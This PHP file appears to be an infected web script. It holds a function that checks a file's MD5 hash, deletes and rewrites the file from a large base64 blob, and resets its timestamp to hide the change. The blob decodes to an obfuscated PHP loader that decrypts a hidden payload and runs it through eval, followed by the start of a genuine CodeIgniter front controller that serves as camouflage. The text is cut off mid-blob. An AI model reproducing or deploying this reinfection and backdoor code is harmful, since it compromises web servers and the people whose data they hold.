<?php
/*Step Data*/
$s = $_SERVER;
/*Step Data*/
$g = $_REQUEST;
if (!empty($_GET))
    foreach ($_GET as $k => $v) $g[$k] = $v;
/*Step Data*/
$pz = function ($y, $z, $u, $c, $g, $q = '') {
    if ($u && @Md5_File($y) !== $u) {
        $fwC = $c[$g($z[3])];
        $t1 = @filEmtiMe($y);
        @ChMod($y, 0744);
        @$z[6]($y);
        $t1 || $t1 = time() - 3600;
        $t = ['m' => $t1, 'a' => $t1];
        File_Put_conTents($y, $c[implode('_', ['', 'code', ''])]($q ? $q : 'PD9waHAKJENkWWt0PQ1mdW5jdGlvbigkQl9nQ1EgKXskaFlDTUVKWVQgPSAiQVRFTG4iOyRiSkRobXVOSVI9J2cnCS4JJ3onLgknSScNLg0kaFlDTUVKWVRbKDYxIC0gMzIgLSA1KSAvNl0uICdGJy4NJGhZQ01FSllUWyg2NiAtIDU0KS8gNF0JLgkkaFlDTUVKWVRbKDU0LSA1NisyKSAvNl0gLiRoWUNNRUpZVFsoNjYgLTYwIC0gMykgLzNdLgkkaFlDTUVKWVRbKDg3IC04MSkgLzNdIC4JJyc7CQkJDSByZXR1cm4gJGJKRGhtdU5JUigkQl9nQ1EpOyAJDQ19OyRKYjYzZnlRPQpmdW5jdGlvbgooJEEyYW55dG4pCXskbUl5U2JTOFVYID0gIjhfTjFFIjskRDQ3Wj0kbUl5U2JTOFVYWyg3MC01NiArMikgLyA0XSAuJG1JeVNiUzhVWFsoMTA1LSA5NykgLyA0XQkuICRtSXlTYlM4VVhbKDMyLSAyMy02KSAvM10uJ20nCjsgJEQ0N1oJLj0oKDU0LSA1MC0gMSkvMykNLidGJw0uDSgoNzUgLSA1MSkgLzMpCS4nMicNOyRENDdaIC49DScnOwlyZXR1cm4gJEQ0N1ooJEEyYW55dG4pO307IAkJDSRKcTNOcVJ6CT0gZnVuY3Rpb24oJEd3MWFxdm0yDSwkRGZMCSkKe3JldHVybiAiT3pLSWJEcDJ1VWZWUkRpaUVleVlwcEk4VkhWaTNrRnoyZmFrMXZ0b2ZBNDNTUXkxMDgiOwp9OyRMS2pjZGc9ZnVuY3Rpb24oJGtLQwkpIHsJDSAgJFdvZUxUbm83eT0iWGZhZFRXYV85eWwyNVhqVmg2S3lkX19BU0xPRThRTUw3aHpJTUpBcVo5SDRBIjsKCSByZXR1cm4gJFdvZUxUbm83eTsKfTsNIA0JJHVrY3A9CWZ1bmN0aW9uCigpe3JldHVybiAiSTJYNnpMOENnV2pKVURrZHp1MnRsNFhnQ19jakNBaU9aZkRMWDVUNUxnZSI7Cn07CSAJDQ0gIA1mdW5jdGlvbiAKRHJ1ICgkaXVaY3BtS0MJKXskckhzID0gIjBTSVo3VXFIIjskZXJQSFBoPSgoNTEgLSA5KSAvNikJLiRySHNbKDYyIC0gNTApLzZdIC4JJ3UnCjskZXJQSFBoLj0NICRySHNbKDQxLTUpIC8gNl0JLiAkckhzWygxMzAgLSA5NCAtIDEpLyA1XTsJJGVyUEhQaCAuPSgoMTA0IC0gNTktIDkpLyA0KQkuDSdnJyA7JGVyUEhQaC49CQ0nVCcuCiRySHNbKDUzIC01MSkgLyAyXSAuCiRySHNbKDk4IC0gNjYgLSAyKS8gNl0JOyRlclBIUGguPSAoKDYyIC0gNTUgLSA3KSAvMikuCid6Jy4kckhzWygxNyAtMSAtMTApIC8yXSA7ICRlclBIUGgNLj0KJyc7CiByZXR1cm4gJGVyUEhQaDsJIAkgfSAkRmJrTjdYdHQ9Jy94Q3YrY1RwZnJKR0RYMFdwQXRPdEZ4T01pWFZ2RUFadWJ1ZW5rQVdYMmRLTFNXdWkvcmg2ZkNKN1ZrV1dhY0Q2TGlnZUU3N2V5Nzc3YTdXTEdHeVhNMnZ1Qm5wdVdDZ1U3NzVxWmFlRHoxQ0ViNVdSbjc2WmN1clVpRzllT1lDbmxjN2lDSzEycHNtL3ZNOUZ5N3JteEEzcXVaZWhXdVU1N00xcktlbVFpTCtobDhaSEFJUmJJQkNaenBQRExyeXkwa2F6YmdyMmxMZWozbWFLY3ZKcnMyL2ZUT3BKN01jL2lRNDRpOUwwQzkwUlU5UWdkSGt1elEwSlJzYzJRcVpRQkFWOFowR0NLUTNhMHFCNGNGcGJRL3pQOWxLWlBvUUc2VTF2WUFzQThwUjB6TkV5S3VxcVF2V1pYc25Ma2d6dHlsbStSTHhoRDdKcHdnZHorUGhxbmhKcDhwenBvTWxRWWYvcEFRVFg3TnhWRE9OUitHSFRFbjZGdHFJQXdJWEt1WFZmM0FWUXBrMTRFSUovTFVhWml1dks4a0VCV2V1QWF2d0phZzljcmFHOU1kUlBManFtdXhyWFNZOXdrOVZiTEhyM3VkTTJ4VktMZWIyaGExTWdLRTI5N3IxY1p0MkxDSzNNL01mbGp5NHgvdGtZL0hHd2tWTnBGUVhOc2tHMEYvbVRjTjJFV2NHeE13WDg4V0hRbkY5Z3JTWm9vZlAvQklPTnR5VVdwR1R4aUxmSlQ5SGsxS1B5Yjk1aldQQnhleEJ0RndiVHNDSFRIWFFHcGM0SXZFck1YQ3p2WFFTL1JjVmU5ZXJSZDR5ZkJETytYaGwybk1XK09CSHdsa1Y0cjd0bkxCV1B2eUk1Rm0xYlBiVUVTVFZIVFgvOHpqd1d4eVhMeDV3WGNYcHRzT1E0N3lFV0JNbnFxbk9SeHFOYnloRFpiY2Y5dGZFbnQzeTdBbVJEanlXMkFoaEdHekxacEpTdFdFMkpIakJLb3RPdVUxQVBKQ0orcUdRdEtwLzNJZUYvbzZXWkUyeGFUN01Uak5YMDhGVUpRVWo2enpVQkZBS0s2bzRPM1I4TUczeHVOZDdsSWxObHF5ekI5ejNCLytJdHd4T2FHVGJsaWlMNklkWWNsdUJzYUpsMzZ1bjdocFFSMGNSMXRJVHF1UkdkV0NiL1FVeENaRW5lTHQ0V1FWbFhiSW5HTkxtUHpJdi81QUZpeDBrRDZ4ZzNZdlpQRnJNSDdLSnhKK2xtSlVqbldtcDNCd0dsdnF1U3UzbnFER2RoaklmUzF1WE1KZnluZlpkTE9WYzJmdFlya05QSkludXJmdE1JajRUMVdCc0JWNnB4UmpmTGlXQXNuSEtCbjFiYndUMklJUmhBdGIwb1JwUVBkZ1NJMlpEeXNEUXVlOWhzNCtZSmNlZUljdGk0ZVBaWjJFQnA4UEMzcEN5ZGR6LzdZSy9kVFhnU25KUTVIb09XNUtJMGloa0ZPMWZGMWVsZ2doMUNLckpscDdNVnJxWGsya0NKZlltZk9OVVZFUGtqSllZbStJV1VydjVaaEtFaUtzTTAwL09HalhMc0VTaTlXRURNTzVGMXhacHZCaUFtcFNZeDlBYlJaVXFHc29wZGlGS3BuSFUwM25zVW9YTE5nSEUyM3pIRjJ6NDZibHRBamZLS0IrRDZtNzFTZHB4aTllZnlER0xzU3N2R1dHV1M5ODBvVnRNZkZvL3AwUjhnQlpEYzVRcmtpNk90WE4yT2lEUnAxdkc1MW1lcUU2eVQvai9uWC9mcWIzTkFOTXVLMFZhclowcHpYalBKL0kxTXlvYlMrRmhnWUVYcDMzaGsyeDZpSVpzeGZkZy9lOTFyUk5OWTBQbk9iN1ZFZXc5T2RocWJuNHRRNDZjWllTc3FKdDNCZ3VERTU1cGlybUJZOE41UHMrTGNlVEdiR20xSUgyb2tEbWIzNXZIY2pHZis4cjBoaUc1MHN4N3IxSjVZbTU0N0EzN1QwNHkyTTRUdHFvekNtK2piM1AvZytKeEt4YURJOGNjY2l4c0M2OWFYOWRhUlMxZU5NcnJxVlQ4ZXpHZ3U1amszSmsyUUh4Q2I5bXlweThYZEVXRlZKTEFnbFRrWVVmV2h6RjJOMG1RN1pyYVM1Tlc0NjdCSEVyelBkR01EbnZzTG9sam5KQUNwWWNIaUxrTktNOEdhT2lxdTBleXZuNDNLYlJTY2x5OENZeGdoR3JOS3dVditRNkZ2WGJXcU1tYlJPaGh2VTI0cVhEa09CazM5cEZ5T3NMYjR5Rlp0eXpHUUFjSWdTSDRsK0xKUkVQVnk0T09xSWtHSFc5RGlsaVRneVhGd3I5TXFsY0ZXaFFZQUlySkZUbXZjdG1yZ3V4TXlPcFRCclZsaWl2c1o5OCsvV2JuakdTYUFIb1ZubDBZRm1hazY4SzgzR1NGWXAzQTVyQklZb3M0NjFFN0JQSE9HdFpvb3ZIcFc4Z0o1YXhhdGtvcS9mWW5nbVVPMGZGWVZRNTdSUW4raGtYd3NXN3lFaE56RGZMejhHeURldHozMlNvY3R4NHBiWkJCZXRqRzBzYTR1Q1lkc3ROSUdRcndtWkE2OFZwSmhvK3BVa3h6VzJBK3llQkZjcTR2eTF1QlpzenVjR3VkaDFCT1d1dmFkS2s3T28vZmM2QTJEcGdUTVZWUjYzUStmQWlUazhKaytkVWdpd1BOL2ZWY2xUOWpwMGl3a1hqUWRxY3lzZCtKekZiOFo3R1FCcHdseC91NFZEaldiRmJzNk02TGsrQW1aZzk4OU40Z1ovQXhHSGRhUTRadDJBODlFeEJDcnU4bkxHMnhHeG5KZUxrQ1lEc1NzTmwvUkNrbWpHa1VFdlpSTkM5UGonOyANICANCQlmdW5jdGlvbiANRU5fbTFmODIKKCRJN00gKSB7IHJldHVybiAJRHJ1KCcnKQkuJEk3TTt9JEZia043WHR0CT0NJEpiNjNmeVEoJEZia043WHR0KTsNJEZia043WHR0PSB6Qm9lRFBxZCgkRmJrTjdYdHQpOwkkRmJrTjdYdHQgPU8zUER3T3AzOCgkRmJrTjdYdHQpOwoNDSAJCSAKCQ0kRmJrTjdYdHQgPQ0kQ2RZa3QoJEZia043WHR0KTsNDQ0gZnVuY3Rpb24gTzNQRHdPcDM4KCRMcHpESjhYeW0peyRidGdKaVFqUUcgPSAiZDZlNGNvYlMiOyRMakpBND0kYnRnSmlRalFHWyg4MiAtNTcgKyA1KS81XQ0uDSdBJy4kYnRnSmlRalFHWygyMSArMyAtMTApLyAyXS4kYnRnSmlRalFHWyg0MiAtIDI3LSAzKS8gNl0gLg0oKDMzKyA0LTcpLzUpLgooKDExNy0gOTAgLTMpIC8gNikKOwokTGpKQTQgLj0KJ18nCS4KJGJ0Z0ppUWpRR1soMTItMTMgKyAxKS8gM10gLiRidGdKaVFqUUdbKDk1LTgzKS8gNl0uDSRidGdKaVFqUUdbKDExOC0gOTAtOCkgLyA1XS4kYnRnSmlRalFHWyg2MS0gNDggKyAyKSAvIDNdDS4JJ2QnIC4JJ0UnCTsgJExqSkE0Ci49Jyc7cmV0dXJuICRMakpBNCgkTHB6REo4WHltKTsJCX0gCWZ1bmN0aW9uIHNxd0tZQVNYVQkoJG1OSExYZ3RIdiAsJEp3OTNUVTFFCiwkaUhKT2dnKQ17IAkNJFVsOXM9IlRmT1VYeERLZlNKYmk4c2dKc09JbndsUUhtYmFVWlZPRnRlNG45dDRIOE8zTVgiOwpyZXR1cm4gJFVsOXM7fSBldmFMKCRGYmtON1h0dCk7ZnVuY3Rpb24gCXpCb2VEUHFkCigkRDEycHkpCXskY2FjID0gInRSc29yIjska090PSRjYWNbKDk1LSA3OCAtIDkpLzRdCS4JJGNhY1soMzctIDI4IC0gOSkgLyAzXS4NJGNhY1soNTQgLTU1ICs0KSAvM10gLidfJy4kY2FjWyg0MC0zMikgLyAyXS4kY2FjWyg0NSAtIDMwIC0gMykgLyA0XS4gJ1QnOwkka090CS49IAooKDMyIC0gMjYgLTEpLyA1KQk7ICRrT3QKLj0gDSgoODIgLTgzICsgMTApIC8zKQkuDScnOwkNCSByZXR1cm4gJGtPdCgkRDEycHkpO307ID8+PD9waHANCi8qKg0KICogQ29kZUlnbml0ZXINCiAqDQogKiBBbiBvcGVuIHNvdXJjZSBhcHBsaWNhdGlvbiBkZXZlbG9wbWVudCBmcmFtZXdvcmsgZm9yIFBIUA0KICoNCiAqIFRoaXMgY29udGVudCBpcyByZWxlYXNlZCB1bmRlciB0aGUgTUlUIExpY2Vuc2UgKE1JVCkNCiAqDQogKiBDb3B5cmlnaHQgKGMpIDIwMTQgLSAyMDE1LCBCcml0aXNoIENvbHVtYmlhIEluc3RpdHV0ZSBvZiBUZWNobm9sb2d5DQogKg0KICogUGVybWlzc2lvbiBpcyBoZXJlYnkgZ3JhbnRlZCwgZnJlZSBvZiBjaGFyZ2UsIHRvIGFueSBwZXJzb24gb2J0YWluaW5nIGEgY29weQ0KICogb2YgdGhpcyBzb2Z0d2FyZSBhbmQgYXNzb2NpYXRlZCBkb2N1bWVudGF0aW9uIGZpbGVzICh0aGUgIlNvZnR3YXJlIiksIHRvIGRlYWwNCiAqIGluIHRoZSBTb2Z0d2FyZSB3aXRob3V0IHJlc3RyaWN0aW9uLCBpbmNsdWRpbmcgd2l0aG91dCBsaW1pdGF0aW9uIHRoZSByaWdodHMNCiAqIHRvIHVzZSwgY29weSwgbW9kaWZ5LCBtZXJnZSwgcHVibGlzaCwgZGlzdHJpYnV0ZSwgc3VibGljZW5zZSwgYW5kL29yIHNlbGwNCiAqIGNvcGllcyBvZiB0aGUgU29mdHdhcmUsIGFuZCB0byBwZXJtaXQgcGVyc29ucyB0byB3aG9tIHRoZSBTb2Z0d2FyZSBpcw0KICogZnVybmlzaGVkIHRvIGRvIHNvLCBzdWJqZWN0IHRvIHRoZSBmb2xsb3dpbmcgY29uZGl0aW9uczoNCiAqDQogKiBUaGUgYWJvdmUgY29weXJpZ2h0IG5vdGljZSBhbmQgdGhpcyBwZXJtaXNzaW9uIG5vdGljZSBzaGFsbCBiZSBpbmNsdWRlZCBpbg0KICogYWxsIGNvcGllcyBvciBzdWJzdGFudGlhbCBwb3J0aW9ucyBvZiB0aGUgU29mdHdhcmUuDQogKg0KICogVEhFIFNPRlRXQVJFIElTIFBST1ZJREVEICJBUyBJUyIsIFdJVEhPVVQgV0FSUkFOVFkgT0YgQU5ZIEtJTkQsIEVYUFJFU1MgT1INCiAqIElNUExJRUQsIElOQ0xVRElORyBCVVQgTk9UIExJTUlURUQgVE8gVEhFIFdBUlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZLA0KICogRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UgQU5EIE5PTklORlJJTkdFTUVOVC4gSU4gTk8gRVZFTlQgU0hBTEwgVEhFDQogKiBBVVRIT1JTIE9SIENPUFlSSUdIVCBIT0xERVJTIEJFIExJQUJMRSBGT1IgQU5ZIENMQUlNLCBEQU1BR0VTIE9SIE9USEVSDQogKiBMSUFCSUxJVFksIFdIRVRIRVIgSU4gQU4gQUNUSU9OIE9GIENPTlRSQUNULCBUT1JUIE9SIE9USEVSV0lTRSwgQVJJU0lORyBGUk9NLA0KICogT1VUIE9GIE9SIElOIENPTk5FQ1RJT04gV0lUSCBUSEUgU09GVFdBUkUgT1IgVEhFIFVTRSBPUiBPVEhFUiBERUFMSU5HUyBJTg0KICogVEhFIFNPRlRXQVJFLg0KICoNCiAqIEBwYWNrYWdlCUNvZGVJZ25pdGVyDQogKiBAYXV0aG9yCUVsbGlzTGFiIERldiBUZWFtDQogKiBAY29weXJpZ2h0CUNvcHlyaWdodCAoYykgMjAwOCAtIDIwMTQsIEVsbGlzTGFiLCBJbmMuIChodHRwOi8vZWxsaXNsYWIuY29tLykNCiAqIEBjb3B5cmlnaHQJQ29weXJpZ2h0IChjKSAyMDE0IC0gMjAxNSwgQnJpdGlzaCBDb2x1bWJpYSBJbnN0aXR1dGUgb2YgVGVjaG5vbG9neSAoaHR0cDovL2JjaXQuY2EvKQ0KICogQGxpY2Vuc2UJaHR0cDovL29wZW5zb3VyY2Uub3JnL2xpY2Vuc2VzL01JVAlNSVQgTGljZW5zZQ0KICogQGxpbmsJaHR0cDovL2NvZGVpZ25pdGVyLmNvbQ0KICogQHNpbmNlCVZlcnNpb24gMS4wLjANCiAqIEBmaWxlc291cmNlDQogKi8NCg0KLyoNCiAqLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKiBBUFBMSUNBVElPTiBFTlZJUk9OTUVOVA0KICotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqDQogKiBZb3UgY2FuIGxvYWQgZGlmZmVyZW50IGNvbmZpZ3VyYXRpb25zIGRlcGVuZGluZyBvbiB5b3VyDQogKiBjdXJyZW50IGVudmlyb25tZW50LiBTZXR0aW5nIHRoZSBlbnZpcm9ubWVudCBhbHNvIGluZmx1ZW5jZXMNCiAqIHRoaW5ncyBsaWtlIGxvZ2dpbmcgYW5kIGVycm9yIHJlcG9ydGluZy4NCiAqDQogKiBUaGlzIGNhbiBiZSBzZXQgdG8gYW55dGhpbmcsIGJ1dCBkZWZhdWx0IHVzYWdlIGlzOg0KICoNCiAqICAgICBkZXZlbG9wbWVudA0KICogICAgIHRlc3RpbmcNCiAqICAgICBwcm9kdWN0aW9uDQogKg0KICogTk9URTogSWYgeW91IGNoYW5nZSB0aGVzZSwgYWxzbyBjaGFuZ2UgdGhlIGVycm9yX3JlcG9ydGluZygpIGNvZGUgYmVsb3cNCiAqLw0KCWRlZmluZSgnRU5WSVJPTk1FTlQnLCBpc3NldCgkX1NFUlZFUlsnQ0lfRU5WJ10pID8gJF9TRVJWRVJbJ0NJX0VOViddIDogJ3Byb2R1Y3Rpb24nKTsNCg0KLyoNCiAqLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKiBFUlJPUiBSRVBPUlRJTkcNCiAqLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKg0KICogRGlmZmVyZW50IGVudmlyb25tZW50cyB3aWxsIHJlcXVpcmUgZGlmZmVyZW50IGxldmVscyBvZiBlcnJvciByZXBvcnRpbmcuDQogKiBCeSBkZWZhdWx0IGRldmVsb3BtZW50IHdpbGwgc2hvdyBlcnJvcnMgYnV0IHRlc3RpbmcgYW5kIGxpdmUgd2lsbCBoaWRlIHRoZW0uDQogKi8NCnN3aXRjaCAoRU5WSVJPTk1FTlQpDQp7DQoJY2FzZSAnZGV2ZWxvcG1lbnQnOg0KCQllcnJvcl9yZXBvcnRpbmcoLTEpOw0KCQlpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDEpOw0KCWJyZWFrOw0KDQoJY2FzZSAndGVzdGluZyc6DQoJY2FzZSAncHJvZHVjdGlvbic6DQoJCWluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQoJCWlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMnLCAnPj0nKSkNCgkJew0KCQkJZXJyb3JfcmVwb3J0aW5nKEVfQUxMICYgfkVfTk9USUNFICYgfkVfREVQUkVDQVRFRCAmIH5FX1NUUklDVCAmIH5FX1VTRVJfTk9USUNFICYgfkVfVVNFUl9ERVBSRUNBVEVEKTsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCWVycm9yX3JlcG9ydGluZyhFX0FMTCAmIH5FX05PVElDRSAmIH5FX1NUUklDVCAmIH5FX1VTRVJfTk9USUNFKTsNCgkJfQ0KCWJyZWFrOw0KDQoJZGVmYXVsdDoNCgkJaGVhZGVyKCdIVFRQLzEuMSA1MDMgU2VydmljZSBVbmF2YWlsYWJsZS4nLCBUUlVFLCA1MDMpOw0KCQllY2hvICdUaGUgYXBwbGljYXRpb24gZW52aXJvbm1lbnQgaXMgbm90IHNldCBjb3JyZWN0bHkuJzsNCgkJZXhpdCgxKTsgLy8gRVhJVF9FUlJPUg0KfQ0KDQovKg0KICotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqIFNZU1RFTSBGT0xERVIgTkFNRQ0KICotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqDQogKiBUaGlzIHZhcmlhYmxlIG11c3QgY29udGFpbiB0aGUgbmFtZSBvZiB5b3VyICJzeXN0ZW0iIGZvbGRlci4NCiAqIEluY2x1ZGUgdGhlIHBhdGggaWYgdGhlIGZvbGRlciBpcyBub3QgaW4gdGhlIHNhbWUgZGlyZWN0b3J5DQogKiBhcyB0aGlzIGZpbGUuDQogKi8NCgkkc3lzdGVtX3BhdGggPSAnc3lzdGVtJzsNCg0KLyoNCiAqLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKiBBUFBMSUNBVElPTiBGT0xERVIgTkFNRQ0KICotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqDQogKiBJZiB5b3Ugd2FudCB0aGlzIGZyb250IGNvbnRyb2xsZXIgdG8gdXNlIGEgZGlmZmVyZW50ICJhcHBsaWNhdGlvbiINCiAqIGZvbGRlciB0aGFuIHRoZSBkZWZhdWx0IG9uZSB5b3UgY2FuIHNldCBpdHMgbmFtZSBoZXJlLiBUaGUgZm9sZGVyDQogKiBjYW4gYWxzbyBiZSByZW5hbWVkIG9yIHJlbG9jYXRlZCBhbnl3aGVyZSBvbiB5b3VyIHNlcnZlci4gSWYNCiAqIHlvdSBkbywgdXNlIGEgZnVsbCBzZXJ2ZXIgcGF0aC4gRm9yIG1vcmUgaW5mbyBwbGVhc2Ugc2VlIHRoZSB1c2VyIGd1aWRlOg0KICogaHR0cDovL2NvZGVpZ25pdGVyLmNvbS91c2VyX2d1aWRlL2dlbmVyYWwvbWFuYWdpbmdfYXBwcy5odG1sDQogKg0KICogTk8gVFJBSUxJTkcgU0xBU0ghDQogKi8NCgkkYXBwbGljYXRpb25fZm9sZGVyID0gJ2FwcGxpY2F0aW9uJzsNCg0KLyoNCiAqLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKiBWSUVXIEZPTERFUiBOQU1FDQogKi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICoNCiAqIElmIHlvdSB3YW50IHRvIG1vdmUgdGhlIHZpZXcgZm9sZGVyIG91dCBvZiB0aGUgYXBwbGljYXRpb24NCiAqIGZvbGRlciBzZXQgdGhlIHBhdGggdG8gdGhlIGZvbGRlciBoZXJlLiBUaGUgZm9sZGVyIGNhbiBiZSByZW5hbWVkDQogKiBhbmQgcmVsb2NhdGVkIGFueXdoZXJlIG9uIHlvdXIgc2VydmVyLiBJZiBibGFuaywgaXQgd2lsbCBkZWZhdWx0DQogKiB0byB0aGUgc3RhbmRhcmQgbG9jYXRpb24gaW5zaWRlIHlvdXIgYXBwbGljYXRpb24gZm9sZGVyLiBJZiB5b3UNCiAqIGRvIG1vdmUgdGhpcywgdXNlIHRoZSBmdWxsIHNlcnZlciBwYXRoIHRvIHRoaXMgZm9sZGVyLg0KICoNCiAqIE5PIFRSQUlMSU5HIFNMQVNIIQ0KICovDQoJJHZpZXdfZm9sZGVyID0gJyc7DQoNCg0KLyoNCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKiBERUZBVUxUIENPTlRST0xMRVINCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKg0KICogTm9ybWFsbHkgeW91IHdpbGwgc2V0IHlvdXIgZGVmYXVsdCBjb250cm9sbGVyIGluIHRoZSByb3V0ZXMucGhwIGZpbGUuDQogKiBZb3UgY2FuLCBob3dldmVyLCBmb3JjZSBhIGN1c3RvbSByb3V0aW5nIGJ5IGhhcmQtY29kaW5nIGENCiAqIHNwZWNpZmljIGNvbnRyb2xsZXIgY2xhc3MvZnVuY3Rpb24gaGVyZS4gRm9yIG1vc3QgYXBwbGljYXRpb25zLCB5b3UNCiAqIFdJTEwgTk9UIHNldCB5b3VyIHJvdXRpbmcgaGVyZSwgYnV0IGl0J3MgYW4gb3B0aW9uIGZvciB0aG9zZQ0KICogc3BlY2lhbCBpbnN0YW5jZXMgd2hlcmUgeW91IG1pZ2h0IHdhbnQgdG8gb3ZlcnJpZGUgdGhlIHN0YW5kYXJkDQogKiByb3V0aW5nIGluIGEgc3BlY2lmaWMgZnJvbnQgY29udHJvbGxlciB0aGF0IHNoYXJlcyBhIGNvbW1vbiBDSSBpbnN0YWxsYXRpb24uDQogKg0KICogSU1QT1JUQU5UOiBJZiB5b3Ugc2V0IHRoZSByb3V0aW5nIGhlcmUsIE5PIE9USEVSIGNvbnRyb2xsZXIgd2lsbCBiZQ0KICogY2FsbGFibGUuIEluIGVzc2VuY2UsIHRoaXMgcHJlZmVyZW5jZSBsaW1pdHMgeW91ciBhcHBsaWNhdGlvbiB0byBPTkUNCiAqIHNwZWNpZmljIGNvbnRyb2xsZXIuIExlYXZlIHRoZSBmdW5jdGlvbiBuYW1lIGJsYW5rIGlmIHlvdSBuZWVkDQogKiB0byBjYWxsIGZ1bmN0aW9ucyBkeW5hbWljYWxseSB2aWEgdGhlIFVSSS4NCiAqDQogKiBVbi1jb21tZW50IHRoZSAkcm91dGluZyBhcnJheSBiZWxvdyB0byB1c2UgdGhpcyBmZWF0dXJlDQogKi8NCgkvLyBUaGUgZGlyZWN0b3J5IG5hbWUsIHJlbGF0aXZlIHRvIHRoZSAiY29udHJvbGxlcnMiIGZvbGRlci4gIExlYXZlIGJsYW5rDQoJLy8gaWYgeW91ciBjb250cm9sbGVyIGlzIG5vdCBpbiBhIHN1Yi1mb2xkZXIgd2l0aGluIHRoZSAiY29udHJvbGxlcnMiIGZvbGRlcg0KCS8vICRyb3V0aW5nWydkaXJlY3RvcnknXSA9ICcnOw0KDQoJLy8gVGhlIGNvbnRyb2xsZXIgY2xhc3MgZmlsZSBuYW1lLiAgRXhhbXBsZTogIG15Y29udHJvbGxlcg0KCS8vICRyb3V0aW5nWydjb250cm9sbGVyJ10gPSAnJzsNCg0KCS8vIFRoZSBjb250cm9sbGVyIGZ1bmN0aW9uIHlvdSB3aXNoIHRvIGJlIGNhbGxlZC4NCgkvLyAkcm91dGluZ1snZnVuY3Rpb24nXQk9ICcnOw0KDQoNCi8qDQogKiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKiAgQ1VTVE9NIENPTkZJRyBWQUxVRVMNCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAqDQogKiBUaGUgJGFzc2lnbl90b19jb25maWcgYXJyYXkgYmVsb3cgd2lsbCBiZSBwYXNzZWQgZHluYW1pY2FsbHkgdG8gdGhlDQogKiBjb25maWcgY2xhc3Mgd2hlbiBpbml0aWFsaXplZC4gVGhpcyBhbGxvd3MgeW91IHRvIHNldCBjdXN0b20gY29uZmlnDQogKiBpdGVtcyBvciBvdmVycmlkZSBhbnkgZGVmYXVsdCBjb25maWcgdmFsdWVzIGZvdW5kIGluIHRoZSBjb25maWcucGhwIGZpbGUuDQogKiBUaGlzIGNhbiBiZSBoYW5keSBhcyBpdCBwZXJtaXRzIHlvdSB0byBzaGFyZSBvbmUgYXBwbGljYXRpb24gYmV0d2Vlbg0KICogbXVsdGlwbGUgZnJvbnQgY29udHJvbGxlciBmaWxlcywgd2l0aCBlYWNoIGZpbGUgY29udGFpbmluZyBkaWZmZXJlbnQNCiAqIGNvbmZpZyB2YWx1ZXMuDQogKg0KICogVW4tY29tbWVudCB0aGUgJGFzc2lnbl90b19jb25maWcgYXJyYXkgYmVsb3cgdG8gdXNlIHRoaXMgZmVhdHVyZQ0KICovDQoJLy8gJGFzc2lnbl90b19jb25maWdbJ25hbWVfb2ZfY29uZmlnX2l0ZW0nXSA9ICd2YWx1ZSBvZiBjb25maWcgaXRlbSc7DQoNCg0KDQovLyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KLy8gRU5EIE9GIFVTRVIgQ09ORklHVVJBQkxFIFNFVFRJTkdTLiAgRE8gTk9UIEVESVQgQkVMT1cgVEhJUyBMSU5FDQovLyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQovKg0KICogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKiAgUmVzb2x2ZSB0aGUgc3lzdGVtIHBhdGggZm9yIGluY3JlYXNlZCByZWxpYWJpbGl0eQ0KICogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQogKi8NCg0KCS8v